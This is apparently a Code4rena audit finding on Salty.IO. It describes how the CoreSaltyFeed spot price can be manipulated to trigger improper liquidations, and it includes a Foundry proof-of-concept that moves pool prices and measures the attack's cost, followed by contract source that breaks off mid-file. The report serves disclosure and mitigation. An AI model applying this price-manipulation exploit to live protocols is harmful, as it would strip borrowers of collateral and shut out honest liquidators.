{
  "Title": "[H-03] The use of spot price by CoreSaltyFeed can lead to price manipulation and undesired liquidations",
  "Content": "\nWhen the price moves, Chainlink instantly reports the spot price, while the TWAP slowly changes the price. The spot price of CoreSaltyFeed can be manipulated, allowing an attacker to move the price in a desired direction.\n\n### Vulnerability Details\n\n1.  The spot price of `CoreSaltyFeed` can be manipulated, even when considering automatic arbitrage. The cost of moving the price depends on the liquidity of the pools. While the protocol is small, it will be cheap to manipulate, but even as it grows, the cost won't become prohibitively expensive.\n    If all the pools have `2*1_000` ETH of value each, the attack will cost only \\~0.0036 ETH to move a price by 3%, and \\~0.0363 ETH to move it by 10%.\n    Refer to the PoCs for the estimated cost of the attack.\n\n2.  Assume the WBTC/USD price moves 3%, from $40,000 to $38,800. Chainlink updates instantly, but the TWAP takes some time. You can see my calculations of the TWAP price change [here](https://docs.google.com/spreadsheets/d/e/2PACX-1vS_WU8z_MOikvCSnGjFLAFpVcOHcti2k82v0b8K4U3tNvXFuA61\\_YedRqmQ6qgJaeiY1YnMulz5uauX/pubhtml).\n\n3.  `CoreSaltyFeed` WBTC/USDS price will be adjusted to match Chainlink's price by arbitrageurs.\n\n4.  `CoreSaltyFeed` returns $38,800, Chainlink returns $38,800, TWAP returns $40,000.\n\n5.  The attacker moves the `CoreSaltyFeed` price \\~3%, but less than the difference between TWAP and Chainlink, to $38,000.\n\n6.  As shown in the PoC, it will cost the attacker only 0.0035 ETH if the pools have 1000 ETH of liquidity, but if they have 100 ETH, it will require only \\~0.0004 ETH.\n\n7.  The difference between `CoreSaltyFeed` and Chainlink is $800, and from TWAP and Chainlink it's $1,200.\n\n8.  The [average price](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/price_feed/PriceAggregator.sol#L139) is set to ($38,000 + $38,800) / 2 = $38,400.\n\n9.  Now the attacker can liquidate pools that should not be liquidatable because the price from PriceAggregator is lower than the real price. The attacker can do it first and get the rewards (5%, up to $500 by default). See the relevant code [here](https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/stable/CollateralAndLiquidity.sol#L171-L173).\n\n    ```solidity\n    // Reward the caller\n    wbtc.safeTransfer( msg.sender, rewardedWBTC );\n    weth.safeTransfer( msg.sender, rewardedWETH );\n    ```\n\n10. `maxRewardValueForCallingLiquidation` is set to $500. Depending on Salty's pool liquidity, ETH price, and how many positions an attacker can liquidate, profitability will vary. I argue that before the protocol gains traction, liquidity will be low for some time, making the attack profitable.\n\n11. We should also consider that sometimes it will be profitable for the attacker to move the price slightly and be the first to call `liquidate` in order to receive the rewards.\n\n12. Other liquidators, who don't use this attack, will not be able to liquidate, which is unfair.\n\nNote: WBTC and WETH movements of 3% are common and will happen often. For example, about a month ago, there was a 6.5% drop in 20 minutes as reported by [Business Insider](https://markets.businessinsider.com/news/currencies/bitcoin-price-cryptocurrency-rally-crash-eth-btc-token-crypto-cpi-2023-12).\n\n **Variations**\n\n1.  If the Chainlink oracle fails to update prices on time (due to block stuffing before the heartbeat or Chainlink DAO turning it off, as described [here](https://medium.com/hackernoon/the-anatomy-of-a-block-stuffing-attack-a488698732ae) and [here](https://medium.com/cyfrin/chainlink-oracle-defi-attacks-93b6cb6541bf#e100)), the attack becomes easier as a 3% price change in the market will not be necessary.\n2.  In the event of a sudden crash in BTC and/or ETH, an attacker could mint undercollateralized USDS. The 200% collateral requirement, set in `StableConfig.initialCollateralRatioPercent` and calculated using the outdated TWAP price along with the manipulated `CoreSaltyFeed`, would be ineffective as protection against this attack when the real price has already dropped below 100%.\n3.  During a sudden crash of BTC and/or ETH, [the oracle price feed may continue to report the incorrect minimum price](https://medium.com/cyfrin/chainlink-oracle-defi-attacks-93b6cb6541bf#00ac). This can again lead to the minting of undercollateralized USDS.\n\n### Impact\n\n1.  Positions that should not be liquidated are liquidated => unexpected liquidation and loss of part of collateral for a borrower (on fees)\n2.  Honest liquidators who don't move the price won't be able to liquidate because an attacker will move the price and liquidate in the same transaction\n\n### Proof of Concept\n\nPut the code in `src/pools/tests/H2.t.sol`, run `COVERAGE=\"yes\" forge test -f wss://ethereum-sepolia.publicnode.com -vvv --mc H2`\n\n<details>\n\n```solidity\n// SPDX-License-Identifier: BUSL 1.1\npragma solidity =0.8.22;\n\nimport \"../../dev/Deployment.sol\";\nimport \"../PoolUtils.sol\";\n\n\ncontract H2 is Deployment\n\t{\n    TestERC20 immutable tokenA;\n    TestERC20 immutable tokenB;\n    address ALICE = address(0x1111);\n    address BOB = address(0x2222);\n\n    \t    constructor()\n\t\t{\n            initializeContracts();\n\n            grantAccessAlice();\n            grantAccessBob();\n            grantAccessCharlie();\n            grantAccessDeployer();\n            grantAccessDefault();\n\n            finalizeBootstrap();\n\n            vm.startPrank(address(daoVestingWallet));\n            salt.transfer(DEPLOYER, 1000000 ether);\n            salt.transfer(address(collateralAndLiquidity), 1000000 ether);\n            vm.stopPrank();\n\n            vm.startPrank( DEPLOYER );\n            tokenA = new TestERC20(\"TOKENA\", 18);\n            tokenB = new TestERC20(\"TOKENB\", 18);\n            vm.stopPrank();\n            _prepareToken(tokenA);\n            _prepareToken(tokenB);\n            _prepareToken(weth);\n\n            vm.stopPrank();\n            vm.prank(address(dao));\n            poolsConfig.whitelistPool( pools, tokenA, tokenB );\n            vm.stopPrank();\n\n\t\t}\n\n        // Make the required approvals and transfer to Bob and Alice.\n        function _prepareToken(IERC20 token) internal {\n            vm.startPrank( DEPLOYER );\n            token.approve( address(pools), type(uint256).max );\n            token.approve( address(collateralAndLiquidity), type(uint256).max );\n            // For WBTC, we can't use 'ether', so we use 10**8.\n            uint decimals = TestERC20(address(token)).decimals();\n            token.transfer(ALICE, 1_000_000 * (10**decimals));\n            token.transfer(BOB, 1_000_000 * (10**decimals));\n\n            vm.startPrank(ALICE);\n            token.approve( address(pools), type(uint256).max );\n            token.approve( address(collateralAndLiquidity), type(uint256).max );\n\n            vm.startPrank(BOB);\n            token.approve( address(pools), type(uint256).max );\n            token.approve( address(collateralAndLiquidity), type(uint256).max );\n            vm.stopPrank();\n        }\n\n        // Create pools that will participate in arbitrage\n        // Note: We have all required pools for successful arbitrage, see ArbitrageSearch::_arbitragePath \n        // swap: swapTokenIn->WETH\n        // arb: WETH->swapTokenIn->WBTC->WETH\n        // We have: tokenA/WETH, tokenA/WBTC, WBTC/WETH\n        function _makeArbitragePossible(uint amountToDeposit) internal {\n            // based on Pools.t.sol::testDepositDoubleSwapWithdraw\n            vm.startPrank(DEPLOYER);\n\n            wbtc.approve(address(collateralAndLiquidity), type(uint256).max );\n            weth.approve(address(collateralAndLiquidity), type(uint256).max );\n            tokenA.approve(address(collateralAndLiquidity), type(uint256).max );\n            tokenB.approve(address(collateralAndLiquidity), type(uint256).max );\n            tokenA.approve(address(pools), type(uint256).max );\n\n            vm.warp(block.timestamp + stakingConfig.modificationCooldown());\n            collateralAndLiquidity.depositCollateralAndIncreaseShare(\n                amountToDeposit * 10**8, amountToDeposit * 1 ether, 0, block.timestamp, false\n            );\n            vm.stopPrank();\n\n            vm.startPrank(address(dao));\n            poolsConfig.whitelistPool( pools, tokenA, wbtc);\n            poolsConfig.whitelistPool( pools, tokenA, weth);\n            poolsConfig.whitelistPool( pools, tokenB, wbtc);\n            poolsConfig.whitelistPool( pools, tokenB, weth);\n            vm.stopPrank();\n\n            vm.startPrank(DEPLOYER);\n            collateralAndLiquidity.depositLiquidityAndIncreaseShare(\n                tokenA, wbtc, amountToDeposit * 1 ether, amountToDeposit * 10**8, 0, \n                block.timestamp, false\n            );\n            collateralAndLiquidity.depositLiquidityAndIncreaseShare(\n                tokenB, wbtc, amountToDeposit * 1 ether, amountToDeposit * 10**8, 0, \n                block.timestamp, false\n            );\n            collateralAndLiquidity.depositLiquidityAndIncreaseShare(\n                tokenA, weth, amountToDeposit * 1 ether, amountToDeposit * 1 ether, 0, \n                block.timestamp, false\n            );\n            collateralAndLiquidity.depositLiquidityAndIncreaseShare(\n                tokenB, weth, amountToDeposit * 1 ether, amountToDeposit * 1 ether, 0, \n                block.timestamp, false\n            );\n\n            vm.stopPrank();\n        }\n\n        function _getReservesAndPrice(IERC20 _tokenA, IERC20 _tokenB) internal view returns (\n            string memory _tokenASymbol, string memory _tokenBSymbol, \n            uint reserveA, uint reserveB, uint priceBinA\n        ) {\n            (reserveA, reserveB) = pools.getPoolReserves(_tokenA, _tokenB);\n            _tokenASymbol = TestERC20(address(_tokenA)).symbol();\n            _tokenBSymbol = TestERC20(address(_tokenB)).symbol();\n            uint8  _tokenADecimals = TestERC20(address(_tokenA)).decimals();\n            uint8  _tokenBDecimals = TestERC20(address(_tokenB)).decimals();\n\n            // reserveA / reserveB  || b.decimals - a.decimals  || normalizer\n            // 1e8/1e18             || diff 10                  || 1e28\n            // 1e18/1e18            || diff 0                   || 1e18\n            // 1e18/1e8             || diff -10                 || 1e8\n            int8 decimalsDiff = int8(_tokenBDecimals) - int8(_tokenADecimals);\n            uint normalizerPower = uint8(int8(18) + decimalsDiff);\n            uint normalizer = 10**normalizerPower;\n\n            // price with precision 1e18\n            priceBinA = reserveB == 0 \n                    ? 0 \n                    : ( reserveA * normalizer ) / reserveB;\n        }\n\n        function _printReservesAndPriceFor(IERC20 _tokenA, IERC20 _tokenB) internal view \n        {\n            (\n                string memory _tokenASymbol, \n                string memory _tokenBSymbol, \n                uint reserveA, \n                uint reserveB, \n                uint priceBinA\n            ) = _getReservesAndPrice(_tokenA, _tokenB);\n\n            console2.log(\"%s reserves: %e\", _tokenASymbol , reserveA);\n            console2.log(\"%s reserves: %e\", _tokenBSymbol, reserveB);\n            console2.log(\"%s price in %s: %e\", _tokenBSymbol, _tokenASymbol, priceBinA);\n            console.log(\"\");\n        }\n\n\n        // Extracted some local variables to storage due to too many local variables.\n        struct MovePriceParams {\n            uint amountToExchange;\n            uint expectedMovementPercents; \n            uint expectedLoss;\n        }\n        uint gasBefore = 1; // Set to 1 to save gas on updates and obtain more accurate gas estimations.\n        uint stepsCount;\n\n        // Splitting a swap into several steps will significantly reduce slippage.\n        // More steps will further reduce slippage, thereby decreasing the cost of the attack.\n        // However, too many steps can incur high gas costs; for instance, 100 steps will cost approximately 3+4=7 million gas (as indicated in the console.log output).\n        uint constant steps = 100;\n        function _movePrice(MovePriceParams memory p) internal {\n            /* Before the attack */\n            console.log(\"\\n%s\", \"__BEFORE\");\n\n            // Check price before\n            (,,,,uint priceBefore) = _getReservesAndPrice(tokenA, weth);\n            assertEq(1 ether, priceBefore); // price is 1:1\n\n            _printReservesAndPriceFor(tokenA, weth);\n            uint wethBefore = weth.balanceOf(ALICE);\n            uint tokenABefore = tokenA.balanceOf(ALICE);\n            console2.log(\"weth.balanceOf(ALICE): %e\", wethBefore);\n            console2.log(\"tokenA.balanceOf(ALICE): %e\", tokenABefore);\n\n            /* Move the price */\n            vm.startPrank(ALICE);\n\n            gasBefore = gasleft();\n            for (uint i; i < steps; i++){\n                pools.depositSwapWithdraw(tokenA, weth, p.amountToExchange/steps, 0, block.timestamp + 300);\n            }\n            console.log(\"Gas first(for) loop: \", gasBefore - gasleft());\n\n\n            /* After the attack */\n            console.log(\"\\n%s\", \"__AFTER\");\n\n            // Console.log the output\n            _printReservesAndPriceFor(tokenA, weth);\n            uint wethAfter = weth.balanceOf(ALICE);\n            uint tokenAAfter = tokenA.balanceOf(ALICE);\n            console2.log(\"weth.balanceOf(ALICE): %e\", weth.balanceOf(ALICE));\n            console2.log(\"tokenA.balanceOf(ALICE): %e\", tokenA.balanceOf(ALICE));\n            uint wethGained = wethAfter - wethBefore;\n            uint tokenALost = tokenABefore - tokenAAfter;\n            console2.log(\"weth.balanceOf(ALICE) diff: %e\", wethGained);\n            console2.log(\"tokenA.balanceOf(ALICE) diff: %e\", tokenALost);\n            // Note: Since the price of tokenA and WETH are the same at the start, with a 1:1 ratio, \n            // we can subtract and add them as equivalent values.\n            uint attackPrice = tokenALost - wethGained;\n            console2.log(\"Losses for the attacker (before swapping back): %e\", attackPrice);\n\n            // Assert that the attack was successful and inexpensive.\n            (,,,,uint priceAfter) = _getReservesAndPrice(tokenA, weth);\n            uint priceDiff = priceAfter - priceBefore;\n            assertTrue(priceDiff >= p.expectedMovementPercents * 1 ether / 100);\n\n            /* The attacker can further reduce the cost by exchanging back. */\n            /* After the exchange, the price is moved back. */\n            console.log(\"\\n%s\", \"__AFTER_EXCHANGING_BACK\");\n            (,,,,uint currentPrice) = _getReservesAndPrice(tokenA, weth);\n            uint step = p.amountToExchange/steps;\n            gasBefore = gasleft();\n            while (currentPrice > 1 ether){\n                pools.depositSwapWithdraw(weth, tokenA, step, 0, block.timestamp);\n                (,,,,currentPrice) = _getReservesAndPrice(tokenA, weth);\n                stepsCount++;\n            }\n\n            // Console.log the output\n            console2.log(\"Gas second(while) loop: \", gasBefore - gasleft());\n            console2.log(\"stepsCount\", stepsCount);\n            _printReservesAndPriceFor(tokenA, weth);\n            uint wethAfterBalancing = weth.balanceOf(ALICE);\n            uint tokenAAfterBalancing = tokenA.balanceOf(ALICE);\n            console2.log(\"weth.balanceOf(ALICE): %e\", weth.balanceOf(ALICE));\n            console2.log(\"tokenA.balanceOf(ALICE): %e\", tokenA.balanceOf(ALICE));\n            int wethDiff = int(wethAfterBalancing) - int(wethBefore);\n            int tokenADiff = int(tokenAAfterBalancing) - int(tokenABefore);\n            console2.log(\"weth.balanceOf(ALICE) diff: %e\", wethDiff);\n            console2.log(\"tokenA.balanceOf(ALICE) diff: %e\", tokenADiff);\n            // Note: Since the price of tokenA and WETH are the same at the start, with a 1:1 ratio, \n            // we can subtract and add them as equivalent values.\n\n            int sumDiff = wethDiff + tokenADiff;\n            console2.log(\"Diff (positive=profit) for the attacker: %e\", sumDiff);\n            console2.log(\"Arbitrage profits for DAO: %e\", pools.depositedUserBalance(address(dao), weth ));\n        }\n\n    function testMovePrice10PercentsFor1000EtherPools() public\n\t\t{\n            _makeArbitragePossible(1_000);\n            _movePrice(MovePriceParams(75 ether, 10, 0.0363 ether));\n\t\t}\n\n    function testMovePrice3PercentsFor1000EtherPools() public\n\t\t{\n            _makeArbitragePossible(1_000);\n            _movePrice(MovePriceParams(23 ether, 3, 0.0036 ether));\n\t\t}\n\n    function testMovePrice3PercentsFor100EtherPools() public\n\t\t{\n            _makeArbitragePossible(100);\n            _movePrice(MovePriceParams(2.3 ether, 3, 0.0004 ether));\n\t\t}\n\n    function testMovePrice3PercentsFor10EtherPools() public\n\t\t{\n            _makeArbitragePossible(10);\n            _movePrice(MovePriceParams(0.23 ether, 3, 0.00008 ether));\n\t\t}\n}\n```\n</details>\n\n(Optional) You can place this AWK script in `1e18.sh`, make it executable with `chmod +x 1e18.sh`, and run `COVERAGE=\"yes\" forge test -f wss://ethereum-sepolia.publicnode.com -vvv --mc M2 | ./1e18.sh` for a more readable output. This script will convert numbers in exponential notation to a floating point format with three decimal places. For example, `1e17` will be printed as `0.100`.\n\n```sh\n#!/bin/bash\n\nawk '{\n    for(i=1; i<=NF; i++) {\n        if ($i ~ /[0-9]+e[+-]?[0-9]+/) {\n            $i = sprintf(\"%.3f\", $i / 1e18)\n        }\n    }\n    print $0\n}'\n\n```\n### Recommended Mitigation Steps\n\nConsider replacing `CoreSaltyFeed` with a different oracle that provides better protection against manipulation, like Band Protocol.\n\n**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/609#issuecomment-1947988990):**\n > Note: the overcollateralized stablecoin mechanism has been removed from the DEX.\n> \n> https://github.com/othernet-global/salty-io/commit/f3ff64a21449feb60a60c0d60721cfe2c24151c1\n\n > The stablecoin framework: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS have been removed:\n> \n> https://github.com/othernet-global/salty-io/commit/88b7fd1f3f5e037a155424a85275efd79f3e9bf9\n> \n\n**Status:** Mitigation confirmed. Full details in reports from [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/31), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/63), and [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/43).\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2024-01-salty",
  "Code": [
    {
      "filename": "src/price_feed/PriceAggregator.sol",
      "content": "// SPDX-License-Identifier: BUSL 1.1\npragma solidity =0.8.22;\n\nimport \"openzeppelin-contracts/contracts/access/Ownable.sol\";\nimport \"./interfaces/IPriceFeed.sol\";\nimport \"./interfaces/IPriceAggregator.sol\";\n\n\n// Compares three different price feeds to provide prices for BTC and ETH\n// The three price feeds are used so that if one fails to work properly, the other two can still correctly report price (the outlier is discarded).\n// setPriceFeed can only be called once every 35 days by default (to allow time to review performance of the most recently upgraded PriceFeed before setting another).\n// priceFeed1, priceFeed2, and priceFeed3 are updateable using DAO.proposeSetContractAddress( \"priceFeed1\" ), etc\ncontract PriceAggregator is IPriceAggregator, Ownable\n    {\n    event PriceFeedSet(uint256 indexed priceFeedNum, IPriceFeed indexed newPriceFeed);\n    event MaximumPriceFeedPercentDifferenceChanged(uint256 newMaxDifference);\n    event SetPriceFeedCooldownChanged(uint256 newCooldown);\n\n\tIPriceFeed public priceFeed1; // CoreUniswapFeed by default\n\tIPriceFeed public priceFeed2; // CoreChainlinkFeed by default\n\tIPriceFeed public priceFeed3; // CoreSaltyFeed by default\n\n\t// The next time at which setPriceFeed can be called\n\tuint256 public priceFeedModificationCooldownExpiration;\n\n\t// The maximum percent difference between two non-zero PriceFeed prices when aggregating price.\n\t// When the two closest PriceFeeds (out of the three) have prices further apart than this the aggregated price is considered invalid.\n\t// Range: 1% to 7% with an adjustment of .50%\n\tuint256 public maximumPriceFeedPercentDifferenceTimes1000 = 3000; // Defaults to 3.0% with a 1000x multiplier\n\n\t// The required cooldown between calls to setPriceFeed.\n\t// Allows time to evaluate the performance of the recently updatef PriceFeed before further updates are made.\n\t// Range: 30 to 45 days with an adjustment of 5 days\n\tuint256 public priceFeedModificationCooldown = 35 days;\n\n\n\tfunction setInitialFeeds( IPriceFeed _priceFeed1, IPriceFeed _priceFeed2, IPriceFeed _priceFeed3 ) public onlyOwner\n\t\t{\n\t\trequire( address(priceFeed1) == address(0), \"setInitialFeeds() can only be called once\" );\n\n\t\tpriceFeed1 = _priceFeed1;\n\t\tpriceFeed2 = _priceFeed2;\n\t\tpriceFeed3 = _priceFeed3;\n\t\t}\n\n\n\tfunction setPriceFeed( uint256 priceFeedNum, IPriceFeed newPriceFeed ) public onlyOwner\n\t\t{\n\t\t// If the required cooldown is not met, simply return without reverting so that the original proposal can be finalized and new setPriceFeed proposals can be made.\n\t\tif ( block.timestamp < priceFeedModificationCooldownExpiration )\n\t\t\treturn;\n\n\t\tif ( priceFeedNum == 1 )\n\t\t\tpriceFeed1 = newPriceFeed;\n\t\telse if ( priceFeedNum == 2 )\n\t\t\tpriceFeed2 = newPriceFeed;\n\t\telse if ( priceFeedNum == 3 )\n\t\t\tpriceFeed3 = newPriceFeed;\n\n\t\tpriceFeedModificationCooldownExpiration = block.timestamp + priceFeedModificationCooldown;\n\t\temit PriceFeedSet(priceFeedNum, newPriceFeed);\n\t\t}\n\n\n\tfunction changeMaximumPriceFeedPercentDifferenceTimes1000(bool increase) public onlyOwner\n\t\t{\n        if (increase)\n            {\n            if (maximumPriceFeedPercentDifferenceTimes1000 < 7000)\n                maximumPriceFeedPercentDifferenceTimes1000 += 500;\n            }\n        else\n            {\n            if (maximumPriceFeedPercentDifferenceTimes1000 > 1000)\n                maximumPriceFeedPercentDifferenceTimes1000 -= 500;\n            }\n\n\t\temit MaximumPriceFeedPercentDifferenceChanged(maximumPriceFeedPercentDifferenceTimes1000);\n\t\t}\n\n\n\tfunction changePriceFeedModificationCooldown(bool increase) public onlyOwner\n\t\t{\n        if (increase)\n            {\n            if (priceFeedModificationCooldown < 45 days)\n                priceFeedModificationCooldown += 5 days;\n            }\n        else\n            {\n            if (priceFeedModificationCooldown > 30 days)\n                priceFeedModificationCooldown -= 5 days;\n            }\n\n\t\temit SetPriceFeedCooldownChanged(priceFeedModificationCooldown);\n\t\t}\n\n\n\tfunction _absoluteDifference( uint256 x, uint256 y ) internal pure returns (uint256)\n\t\t{\n\t\tif ( x > y )\n\t\t\treturn x - y;\n\n\t\treturn y - x;\n\t\t}\n\n\n\tfunction _aggregatePrices( uint256 price1, uint256 price2, uint256 price3 ) internal view returns (uint256)\n\t\t{\n\t\tuint256 numNonZero;\n\n\t\tif (price1 > 0)\n\t\t\tnumNonZero++;\n\n\t\tif (price2 > 0)\n\t\t\tnumNonZero++;\n\n\t\tif (price3 > 0)\n\t\t\tnumNonZero++;\n\n\t\t// If less than two price sources then return zero to indicate failure\n\t\tif ( numNonZero < 2 )\n\t\t\treturn 0;\n\n\t\tuint256 diff12 = _absoluteDifference(price1, price2);\n\t\tuint256 diff13 = _absoluteDifference(price1, price3);\n\t\tuint256 diff23 = _absoluteDifference(price2, price3);\n\n\t\tuint256 priceA;\n\t\tuint256 priceB;\n\n\t\tif ( ( diff12 <= diff13 ) && ( diff12 <= diff23 ) )\n\t\t\t(priceA, priceB) = (price1, price2);\n\t\telse if ( ( diff13 <= diff12 ) && ( diff13 <= diff23 ) )\n\t\t\t(priceA, priceB) = (price1, price3);\n\t\telse if ( ( diff23 <= diff12 ) && ( diff23 <= diff13 ) )\n\t\t\t(priceA, priceB) = (price2, price3);\n\n\t\tuint256 averagePrice = ( priceA + priceB ) / 2;\n\n\t\t// If price sources are too far apart then return zero to indicate failure\n\t\tif (  (_absoluteDifference(priceA, priceB) * 100000) / averagePrice > maximumPriceFeedPercentDifferenceTimes1000 )\n\t\t\treturn 0;\n\n\t\treturn averagePrice;\n\t\t}\n\n\n\tfunction _getPriceBTC(IPriceFeed priceFeed) internal view returns (uint256 price)\n\t\t{\n \t\ttry priceFeed.getPriceBTC() returns (uint256 _price)\n\t\t\t{\n\t\t\tprice = _price;\n\t\t\t}\n\t\tcatch (bytes memory)\n\t\t\t{\n\t\t\t// price remains 0\n\t\t\t}\n\t\t}\n\n\n\tfunction _getPriceETH(IPriceFeed priceFeed) internal view returns (uint256 price)\n\t\t{\n \t\ttry priceFeed.getPriceETH() returns (uint256 _price)\n\t\t\t{\n\t\t\tprice = _price;\n\t\t\t}\n\t\tcatch (bytes memory)\n\t\t\t{\n\t\t\t// price remains 0\n\t\t\t}\n\t\t}\n\n\n\t// Return the current BTC price (with 18 decimals)\n\tfunction getPriceBTC() external view returns (uint256 price)\n\t\t{\n\t\tuint256 price1 = _getPriceBTC(priceFeed1);\n\t\tuint256 price2 = _getPriceBTC(priceFeed2);\n\t\tuint256 price3 = _getPriceBTC(priceFeed3);\n\n\t\tprice = _aggregatePrices(price1, price2, price3);\n\t\trequire (price != 0, \"Invalid BTC price\" );\n\t\t}\n\n\n\t// Return the current ETH price (with 18 decimals)\n\tfunction getPriceETH() external view returns (uint256 price)\n\t\t{\n\t\tuint256 price1 = _getPriceETH(priceFeed1);\n\t\tuint256 price2 = _getPriceETH(priceFeed2);\n\t\tuint256 price3 = _getPriceETH(priceFeed3);\n\n\t\tprice = _aggregatePrices(price1, price2, price3);\n\t\trequire (price != 0, \"Invalid ETH price\" );\n\t\t}\n    }"
    },
    {
      "filename": "src/stable/CollateralAndLiquidity.sol",
      "content": "// SPDX-License-Identifier: BUSL 1.1\npragma solidity =0.8.22;\n\nimport \"openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport \"openzeppelin-contracts/contracts/utils/structs/EnumerableSet.sol\";\nimport \"openzeppelin-contracts/contracts/token/ERC20/ERC20.sol\";\nimport \"openzeppelin-contracts/contracts/token/ERC20/extensions/IERC20Metadata.sol\";\nimport \"../price_feed/interfaces/IPriceAggregator.sol\";\nimport \"./interfaces/ICollateralAndLiquidity.sol\";\nimport \"./interfaces/IStableConfig.sol\";\nimport \"./interfaces/ILiquidizer.sol\";\nimport \"../staking/Liquidity.sol\";\n\n// The deployed contract through which all liquidity on the exchange is deposited and withdrawn.\n// Also allows users to deposit WBTC/WETH liquidity as collateral for borrowing USDS stablecoin.\n\n// The default initial collateralization ratio of collateral / borrowed USDS is 200%.\n// The minimum default collateral ratio is 110%, below which positions can be liquidated by any user.\n// Users who call the liquidation function on undercollateralized positions receive a default 5% of the liquidated collateral (up to a default max value of $500).\n// Liquidated users lose their deposited WBTC/WETH collateral and keep the USDS that they borrowed.\n\ncontract CollateralAndLiquidity is Liquidity, ICollateralAndLiquidity\n    {\n    event CollateralDeposited(address indexed depositor, uint256 amountWBTC, uint256 amountWETH, uint256 liquidity);\n    event CollateralWithdrawn(address indexed withdrawer, uint256 collateralWithdrawn, uint256 reclaimedWBTC, uint256 reclaimedWETH);\n    event BorrowedUSDS(address indexed borrower, uint256 amountBorrowed);\n    event RepaidUSDS(address indexed repayer, uint256 amountRepaid);\n    event Liquidation(address indexed liquidator, address indexed liquidatee, uint256 reclaimedWBTC, uint256 reclaimedWETH, uint256 originallyBorrowedUSDS);\n\n\tusing SafeERC20 for IERC20;\n\tusing SafeERC20 for IUSDS;\n    using EnumerableSet for EnumerableSet.AddressSet;\n\n    IStableConfig immutable public stableConfig;\n\tIPriceAggregator immutable public priceAggregator;\n    IUSDS immutable public usds;\n\tIERC20 immutable public wbtc;\n\tIERC20 immutable public weth;\n\tILiquidizer immutable public liquidizer;\n\n\t// Cached for efficiency\n\tuint256 immutable public wbtcTenToTheDecimals;\n    uint256 immutable public wethTenToTheDecimals;\n\n   \t// Keeps track of wallets that have borrowed USDS (so that they can be checked easily for sufficient collateral ratios)\n   \tEnumerableSet.AddressSet private _walletsWithBorrowedUSDS;\n\n\t// The amount of USDS that has been borrowed by each user\n    mapping(address=>uint256) public usdsBorrowedByUsers;\n\n\n    constructor( IPools _pools, IExchangeConfig _exchangeConfig, IPoolsConfig _poolsConfig, IStakingConfig _stakingConfig, IStableConfig _stableConfig, IPriceAggregator _priceAggregator, ILiquidizer _liquidizer )\n\t\tLiquidity( _pools, _exchangeConfig, _poolsConfig, _stakingConfig )\n    \t{\n\t\tpriceAggregator = _priceAggregator;\n        stableConfig = _stableConfig;\n        liquidizer = _liquidizer;\n\n\t\tusds = _exchangeConfig.usds();\n\t\twbtc = exchangeConfig.wbtc();\n\t\tweth = exchangeConfig.weth();\n\n\t\twbtcTenToTheDecimals = 10 ** IERC20Metadata(address(wbtc)).decimals();\n\t\twethTenToTheDecimals = 10 ** IERC20Metadata(address(weth)).decimals();\n    \t}\n\n\n\t// Deposit WBTC/WETH liqudity as collateral and increase the caller's collateral share for future rewards.\n\t// Requires exchange access for the sending wallet (through depositLiquidityAndIncreaseShare)\n\tfunction depositCollateralAndIncreaseShare( uint256 maxAmountWBTC, uint256 maxAmountWETH, uint256 minLiquidityReceived, uint256 deadline, bool useZapping ) external nonReentrant ensureNotExpired(deadline)  returns (uint256 addedAmountWBTC, uint256 addedAmountWETH, uint256 addedLiquidity)\n\t\t{\n\t\t// Have the user deposit the specified WBTC/WETH liquidity and increase their collateral share\n\t\t(addedAmountWBTC, addedAmountWETH, addedLiquidity) = _depositLiquidityAndIncreaseShare( wbtc, weth, maxAmountWBTC, maxAmountWETH, minLiquidityReceived, useZapping );\n\n\t\temit CollateralDeposited(msg.sender, addedAmountWBTC, addedAmountWETH, addedLiquidity);\n\t\t}\n\n\n\t// Withdraw WBTC/WETH collateral and claim any pending rewards.\n    function withdrawCollateralAndClaim( uint256 collateralToWithdraw, uint256 minReclaimedWBTC, uint256 minReclaimedWETH, uint256 deadline ) external nonReentrant ensureNotExpired(deadline) returns (uint256 reclaimedWBTC, uint256 reclaimedWETH)\n\t\t{\n\t\t// Make sure that the user has collateral and if they have borrowed USDS that collateralToWithdraw doesn't bring their collateralRatio below allowable levels.\n\t\trequire( userShareForPool( msg.sender, collateralPoolID ) > 0, \"User does not have any collateral\" );\n\t\trequire( collateralToWithdraw <= maxWithdrawableCollateral(msg.sender), \"Excessive collateralToWithdraw\" );\n\n\t\t// Withdraw the WBTC/WETH liquidity from the liquidity pool (sending the reclaimed tokens back to the user)\n\t\t(reclaimedWBTC, reclaimedWETH) = _withdrawLiquidityAndClaim( wbtc, weth, collateralToWithdraw, minReclaimedWBTC, minReclaimedWETH );\n\n\t\temit CollateralWithdrawn(msg.sender, collateralToWithdraw, reclaimedWBTC, reclaimedWETH);\n\t\t}\n\n\n\t// Borrow USDS using existing collateral, making sure that the amount being borrowed does not exceed maxBorrowable\n\t// Requires exchange access for the sending wallet\n    function borrowUSDS( uint256 amountBorrowed ) external nonReentrant\n\t\t{\n\t\trequire( exchangeConfig.walletHasAccess(msg.sender), \"Sender does not have exchange access\" );\n\t\trequire( userShareForPool( msg.sender, collateralPoolID ) > 0, \"User does not have any collateral\" );\n\t\trequire( amountBorrowed <= maxBorrowableUSDS(msg.sender), \"Excessive amountBorrowed\" );\n\n\t\t// Increase the borrowed amount for the user\n\t\tusdsBorrowedByUsers[msg.sender] += amountBorrowed;\n\n\t\t// Remember that the user has borrowed USDS (so they can later be checked for sufficient collateralization ratios and liquidated if necessary)\n\t\t_walletsWithBorrowedUSDS.add(msg.sender);\n\n\t\t// Mint USDS and send it to the user\n\t\tusds.mintTo( msg.sender, amountBorrowed );\n\n\t\temit BorrowedUSDS(msg.sender, amountBorrowed);\n\t\t}\n\n\n     // Repay borrowed USDS and adjust the user's usdsBorrowedByUser\n     function repayUSDS( uint256 amountRepaid ) external nonReentrant\n\t\t{\n\t\trequire( userShareForPool( msg.sender, collateralPoolID ) > 0, \"User does not have any collateral\" );\n\t\trequire( amountRepaid <= usdsBorrowedByUsers[msg.sender], \"Cannot repay more than the 